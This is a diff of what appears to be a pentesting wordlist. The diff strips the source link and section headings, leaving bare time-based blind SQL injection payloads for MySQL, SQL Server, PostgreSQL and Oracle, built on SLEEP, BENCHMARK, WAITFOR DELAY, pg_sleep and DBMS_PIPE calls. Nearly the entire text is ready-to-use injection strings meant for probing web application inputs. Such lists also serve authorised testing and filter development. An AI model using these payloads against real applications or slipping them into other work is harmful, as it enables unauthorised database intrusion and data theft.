@@ -1,7 +1,3 @@
-# Source https://ansar0047.medium.com/
-
-### MySQL Blind (Time Based):
-
 0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
 0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
 if(now()=sysdate(),sleep(5),0)
@@ -30,8 +26,6 @@ desc%2c(select*from(select(sleep(5)))a)
 (select(0)from(select(sleep(5)))v)%2f*'+
 (select(0)from(select(sleep(5)))v)+'"+
 (select(0)from(select(sleep(5)))v)+"*%2f
-
-### AND BLIND:
 1 and sleep 5--
 1 and sleep 5
 1 and sleep(5)--
@@ -59,8 +53,6 @@ AnD SLEEP(5)#
 ' AND SLEEP(5)#
 " AND SLEEP(5)#
 ') AND SLEEP(5)#
-
-### OR BLIND:
 or sleep 5--
 or sleep 5
 or sleep(5)--
@@ -79,8 +71,6 @@ or SLEEP(5)='
 ' OR SLEEP(5)#
 " OR SLEEP(5)#
 ') OR SLEEP(5)#
-
-###  You can replace AND / OR:
 1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)
 1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (1337=1337
 1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
@@ -123,8 +113,6 @@ or SLEEP(5)='
 ' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) OR '1337'='1337
 ') WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
 ") WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
-
-### RLIKE BLIND: You can replace AND / OR
 RLIKE SLEEP(5)--
 ' RLIKE SLEEP(5)--
 ' RLIKE SLEEP(5)-- 1337
@@ -166,8 +154,6 @@ RLIKE SLEEP(5)--
 ") WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
 ' WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
 " WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
-
-### ELT Blind: You can replace AND / OR
 ' AND ELT(1337=1337,SLEEP(5))--
 ' AND ELT(1337=1337,SLEEP(5))-- 1337
 " AND ELT(1337=1337,SLEEP(5))-- 1337
@@ -220,8 +206,6 @@ RLIKE SLEEP(5)--
 ")) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
 ') AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
 ") AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
-
-### BENCHMARK: You can replace AND / OR
 ' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))--
 ' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
 " AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
@@ -245,8 +229,6 @@ RLIKE SLEEP(5)--
 "))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((("1337" LIKE "1337
 " AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND "1337" LIKE "1337
 ' AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND '1337'='1337
-
-### Microsoft SQL Server Blind (Time Based):
 ;waitfor delay '0:0:5'--
 ';WAITFOR DELAY '0:0:5'--
 );waitfor delay '0:0:5'--
@@ -282,8 +264,6 @@ WAITFOR DELAY '0:0:5'
 ") WAITFOR DELAY '0:0:5'--
 ")) WAITFOR DELAY '0:0:5'--
 "))) WAITFOR DELAY '0:0:5'--
-
-### Postgresql Blind (Time Based):
 ";SELECT pg_sleep(5);
 ;SELECT pg_sleep(5);
 and SELECT pg_sleep(5);
@@ -314,15 +294,11 @@ or SELECT pg_sleep(5);
 1' AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND '1337'='1337
 1') AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND ('1337'='1337
 1) AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND (1337=1337
-
-### Oracle Blind (Time Based): You can replace AND / OR
 1 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5)
 1 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5)-- 1337
 ' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND '1337'='1337
 ') AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND ('1337'='1337
 ) AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND (1337=1337
-
-### Generic Time Based SQL Injection Payloads:
 sleep(5)#
 (sleep 5)--
 (sleep 5)
